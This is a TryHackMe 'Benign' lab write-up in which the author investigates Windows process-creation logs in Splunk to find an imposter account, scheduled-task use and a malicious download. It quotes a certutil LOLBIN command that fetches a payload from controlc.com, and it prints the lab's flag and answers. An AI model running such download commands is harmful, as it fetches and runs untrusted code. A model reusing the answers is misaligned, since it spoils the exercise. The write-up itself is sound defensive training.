# TryHackMe - Benign

## Overview

In this room, I investigated Windows Process Creation logs (Event ID 4688) using Splunk. The objective was to identify suspicious activity on a compromised HR workstation by analyzing process execution logs.

 ### Link: https://tryhackme.com/room/benign
---

## Scenario

A client’s IDS detected suspicious process execution on one of the HR department's hosts. Due to limited resources, only Windows Process Creation logs (Event ID 4688) were collected and ingested into Splunk under the `win_eventlogs` index for investigation.

---

# Investigation

## 1. Total Logs Ingested

To begin the investigation, I set the Splunk time range to **March 2022** to determine how many events were available for analysis.

**Finding**

A total of **13,959** events were ingested during March 2022.

**Answer**

```
13959
```
![alt text](images/ToalEvents.png)


---

## 2. Identifying the Imposter Account

The room mentioned that an imposter account existed in the environment. To identify it, I listed the most common usernames found in the logs.

### Query

```spl
index=win_eventlogs
| top limit=11 UserName
```

### Why this query?

- Searches all Windows process creation logs.
- Lists the most common usernames.
- Makes it easier to identify usernames that don't match legitimate users.

### Finding

Among the usernames, I noticed **Amel1a**, which closely resembles the legitimate user **Amelia**. The number **1** replaces the letter **i**, making it appear as an impersonation account.

![alt text](images/Imposter.png)

**Answer**

```
Amel1a
```

---

## 3. Finding the HR User Running Scheduled Tasks

Scheduled tasks are commonly used for automation but can also be abused by attackers. I searched for the keyword `schtasks` to identify users executing scheduled task commands.

### Query

```spl
index=win_eventlogs schtasks
```

### Why this query?

- Searches for process creation events containing the keyword `schtasks`.
- Helps identify users creating or running scheduled tasks.

### Finding

The results showed that **Chris.fort** executed scheduled task commands.

![alt text](images/RunningScheduledTasks.png)

**Answer**

```
Chris.fort
```

---

## 4. Identifying the User Who Downloaded the Payload

The challenge mentioned that an HR user used a LOLBIN to download a malicious payload. Since the affected system belonged to the HR department, I searched for unusual command-line executions on HR hosts.

### Query

```spl
index=win_eventlogs HostName="*HR*"
| rare limit=20 CommandLine
```

### Why this query?

- Filters the search to HR hosts.
- Displays uncommon command-line executions.
- Rare commands often help highlight suspicious activity.

### Finding

One of the results immediately stood out:

```text
certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
```

The command shows that **certutil.exe** was used to download a file from **controlc.com**.

After reviewing the event details, I found that the command was executed by **haroon**.

 > **Evidence**

![alt text](images/PayloadDownload1.png)
![alt text](images/PayloadDownload2.png)

**Answer**

```
haroon
```
---

## 5. Identifying the LOLBIN

The previous command revealed the Windows binary used to download the payload.

### Finding

The attacker used **certutil.exe**, a legitimate Windows utility that can be abused to download files from the internet.

> **Evidence**

![alt text](images/LOLBIN.png)

**Answer**

```
certutil.exe
```


---

## 6. Finding the Execution Date

The event timestamp shows when the suspicious command was executed.

### Finding

![alt text](images/Time.png)

The binary was executed on:

```
2022-03-04
```

---

## 7. Identifying the Third-Party Website

The command line also revealed the file-sharing website used to host the payload.

### Finding

The payload was downloaded from:

```
controlc.com
```

---

## 8. Identifying the Downloaded File

The same command line showed the name of the downloaded file.

### Finding

![alt text](images/File.png)

The downloaded payload was saved as:

```
benign.exe
```

---

## 9. Finding the Malicious Pattern

The downloaded file contained the following pattern.

### Finding

![alt text](images/MaliciousPattern.png)

```
THM{KJ&*H^B0}
```

---

## 10. Identifying the Malicious URL

The full URL used by the infected host was:

```
https://controlc.com/e4d11035
```

---

# Skills Practiced

- Splunk Search Processing Language (SPL)
- Windows Event Log Analysis
- Process Creation Investigation (Event ID 4688)
- Identifying LOLBIN Abuse
- Basic SOC Investigation

---


# Conclusion

This room helped me practice investigating Windows process creation logs using Splunk. By searching for suspicious users, scheduled tasks, and uncommon command-line executions, I was able to identify the compromised user, the LOLBIN used, and the source of the downloaded payload.